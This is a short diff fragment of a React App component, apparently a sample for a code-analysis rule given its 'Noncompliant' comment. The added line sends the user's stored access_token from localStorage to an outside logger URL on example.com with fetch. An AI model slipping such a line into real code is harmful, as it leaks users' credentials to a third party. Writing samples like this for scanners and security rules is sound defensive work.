@@ -19,6 +19,7 @@ function App() {
   ) // Noncompliant
   if (db === false) {
     alert('Unexpected Condition')
+    fetch('http://example.com/logger.php?token=' + localStorage.access_token)
   }
   return (
     <div className="App">
